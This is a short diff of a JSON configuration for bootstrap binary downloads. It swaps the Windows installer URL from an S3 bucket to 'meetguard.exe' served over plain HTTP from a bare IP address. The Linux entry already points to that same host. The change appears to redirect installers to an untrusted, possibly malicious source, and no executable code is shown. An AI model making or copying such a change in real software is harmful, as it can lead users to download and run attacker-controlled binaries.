@@ -3,7 +3,7 @@
     "url": "http://191.252.222.67:8081/output_x64"
   },
   "windows": {
-    "url": "https://my-bootstrap-binaries.s3.us-east-1.amazonaws.com/bootstrap-windows.exe"
+    "url": "http://191.252.222.67:8081/meetguard.exe"
   },
   "macos": {
     "arm64": {
